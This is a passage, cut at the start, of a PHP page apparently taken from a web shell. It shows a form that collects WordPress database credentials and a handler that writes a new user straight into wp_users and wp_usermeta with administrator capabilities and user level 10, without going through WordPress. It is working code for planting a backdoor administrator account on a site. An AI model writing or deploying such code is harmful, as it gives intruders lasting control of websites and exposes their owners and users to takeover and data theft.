        .modal-popup {
            background-color: #f0f0f0;
            padding: 20px;
            border: 2px solid #000;
            border-radius: 8px;
            width: 350px;
            margin: 20px auto;
        }
        .modal-popup input[type=text], .modal-popup input[type=password] {
            width: 100%;
            padding: 6px 8px;
            margin-bottom: 10px;
            border-radius: 4px;
            border: 1px solid #999;
        }
        .modal-popup input[type=submit] {
            padding: 8px 12px;
            border-radius: 5px;
            border: none;
            background-color: #40e0d0;
            color: #3d3d3d;
            cursor: pointer;
        }
        .modal-popup input[type=submit]:hover {
            background-color: #3d3d3d;
            color: #fff;
        }
    </style>

    <div class="modal-popup">
        <h3 style="text-align:center; color: #3d3d3d;">CREATE WORDPRESS ADMIN PASSWORD</h3>
        <form method="post">
            <input type="text" name="db_name" placeholder="DB_NAME" required>
            <input type="text" name="db_user" placeholder="DB_USER" required>
            <input type="text" name="db_password" placeholder="DB_PASSWORD" required>
            <input type="text" name="db_host" placeholder="DB_HOST" value="127.0.0.1" required>
            <hr>
            <input type="text" name="wp_user" placeholder="Your Username" required>
            <input type="text" name="wp_email" placeholder="Your Email" required>
            <input type="password" name="wp_pass" placeholder="Your Password" required>
            <input type="submit" name="submitwp" value="Submit">
        </form>
    </div>
    ';
}

if (isset($_POST['submitwp'])) {
    $db_name = $_POST['db_name'];
    $db_user = $_POST['db_user'];
    $db_pass = $_POST['db_password'];
    $db_host = $_POST['db_host'];

    $wp_user  = trim($_POST['wp_user']);
    $wp_email = trim($_POST['wp_email']); // <-- perbaikan di sini
    $wp_pass  = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);

    if (!filter_var($wp_email, FILTER_VALIDATE_EMAIL)) {
        die("<div style='color:red;'>Email tidak valid.</div>");
    }

    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $conn->set_charset('utf8mb4');

    // Masukkan user
    $stmt = $conn->prepare("
        INSERT INTO wp_users (
            user_login, user_pass, user_nicename, user_email, user_url,
            user_registered, user_activation_key, user_status, display_name
        ) VALUES (?, ?, ?, ?, '', NOW(), '', 0, ?)
    ");
    // gunakan username sebagai nicename & display_name (bisa diganti sesuai kebutuhan)
    $nicename = $wp_user;
    $display  = $wp_user;
    $stmt->bind_param("sssss", $wp_user, $wp_pass, $nicename, $wp_email, $display);

    if ($stmt->execute()) {
        $user_id = $conn->insert_id;

        // Tambah capabilities (administrator) dan user level
        $capabilities = 'a:1:{s:13:"administrator";s:1:"1";}';
        $level = '10';

        $stmt_meta = $conn->prepare("
            INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
            VALUES 
                (?, 'wp_capabilities', ?),
                (?, 'wp_user_level', ?)
        ");
        $stmt_meta->bind_param("isis", $user_id, $capabilities, $user_id, $level);

        if ($stmt_meta->execute()) {
            echo "<div style='text-align:center; color:green;'><strong>User WordPress berhasil dibuat!</strong></div>";
        } else {
            echo "<div style='color:red;'>Gagal menambahkan usermeta: " . $conn->error . "</div>";
        }
    } else {
        echo "<div style='color:red;'>Gagal membuat user: " . $conn->error . "</div>";
    }

    $conn->close();
}






				?>
			</table>
		</div>
	</div>
</body>
</html>
